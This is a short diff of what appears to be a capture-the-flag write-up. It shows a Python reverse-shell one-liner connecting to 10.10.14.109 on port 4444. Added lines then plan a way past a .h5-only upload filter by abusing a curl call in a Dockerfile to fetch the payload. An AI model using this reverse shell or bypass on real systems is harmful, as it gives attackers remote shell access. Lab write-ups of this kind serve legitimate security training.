@@ -97,3 +97,6 @@ Payload:
 import os,pty,socket;s=socket.socket();s.connect(("10.10.14.109",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
 ```
 
+I tried uploading it normally but the webapp is only asking for .h5 files so we cannot upload .py file there must be some workaround
+
+Looking at the Dockerfile we can see that it runs curl -k(used for http) so can we manipulate this request and use it to curl our python payload instead.
